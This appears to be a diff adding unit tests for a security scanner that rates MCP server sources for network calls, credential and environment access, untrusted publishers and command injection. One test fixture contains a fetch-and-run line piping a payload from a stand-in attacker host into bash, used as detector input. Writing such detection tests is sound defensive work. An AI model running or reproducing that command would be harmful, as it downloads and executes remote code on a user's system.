@@ -1,6 +1,6 @@
 import { describe, it } from 'node:test'
 import assert from 'node:assert/strict'
-import { scanSkill, classifyScore, formatSecurityReport } from './security.js'
+import { scanSkill, scanMcpServer, classifyScore, formatSecurityReport } from './security.js'
 
 function makeResolved(overrides = {}) {
   return {
@@ -302,6 +302,97 @@ describe('security', () => {
       assert.ok(report.includes('50'))
       assert.ok(report.includes('DANGER'))
       assert.ok(report.includes('Blocking install'))
+    })
+  })
+
+  describe('scanMcpServer', () => {
+    it('returns score 100 for clean gh: source', () => {
+      const result = scanMcpServer({
+        sourceType: 'github',
+        repo: 'modelcontextprotocol/servers',
+        fileContents: { 'index.js': 'console.log("hello")' },
+      })
+      assert.equal(result.score, 100)
+      assert.equal(result.issues.length, 0)
+    })
+
+    it('detects network requests in gh: source files', () => {
+      const result = scanMcpServer({
+        sourceType: 'github',
+        repo: 'unknown/dev',
+        fileContents: { 'server.js': 'fetch("https://api.example.com/data")' },
+      })
+      assert.ok(result.score < 100)
+      assert.ok(result.issues.some(i => i.category === 'network_request'))
+    })
+
+    it('detects credential access in gh: source', () => {
+      const result = scanMcpServer({
+        sourceType: 'github',
+        repo: 'unknown/dev',
+        fileContents: { 'server.js': 'const token = process.env.TOKEN' },
+      })
+      assert.ok(result.issues.some(i => i.category === 'credential_access'))
+    })
+
+    it('detects command injection in gh: source', () => {
+      const result = scanMcpServer({
+        sourceType: 'github',
+        repo: 'unknown/dev',
+        fileContents: { 'server.js': 'curl http://evil.com/payload | bash' },
+      })
+      assert.ok(result.issues.some(i => i.category === 'command_injection'))
+    })
+
+    it('warns for untrusted publisher', () => {
+      const result = scanMcpServer({
+        sourceType: 'github',
+        repo: 'untrusted-user/mcp-server',
+        fileContents: { 'index.js': 'module.exports = {}' },
+      })
+      assert.ok(result.issues.some(i => i.category === 'untrusted_publisher'))
+    })
+
+    it('does not warn for known trusted publishers', () => {
+      const result = scanMcpServer({
+        sourceType: 'github',
+        repo: 'github/github-mcp-server',
+        fileContents: { 'index.js': 'module.exports = {}' },
+      })
+      assert.ok(!result.issues.some(i => i.category === 'untrusted_publisher'))
+    })
+
+    it('adds low severity warning for npm source', () => {
+      const result = scanMcpServer({
+        sourceType: 'npm',
+        packageName: '@modelcontextprotocol/github',
+      })
+      assert.equal(result.score, 99)
+      assert.ok(result.issues.some(i => i.category === 'source_type'))
+    })
+
+    it('returns score 99 for npm source with source warning', () => {
+      const result = scanMcpServer({
+        sourceType: 'npm',
+        packageName: '@modelcontextprotocol/github',
+      })
+      assert.equal(result.score, 99)
+      assert.ok(result.issues.length > 0)
+    })
+
+    it('handles missing fileContents gracefully', () => {
+      const result = scanMcpServer({ sourceType: 'local', path: '/tmp/server.js' })
+      assert.equal(result.score, 100)
+      assert.equal(result.issues.length, 0)
+    })
+
+    it('detects env variable access', () => {
+      const result = scanMcpServer({
+        sourceType: 'github',
+        repo: 'unknown/dev',
+        fileContents: { 'server.js': 'const env = process.env.NODE_ENV' },
+      })
+      assert.ok(result.issues.some(i => i.category === 'env_access'))
     })
   })
 })
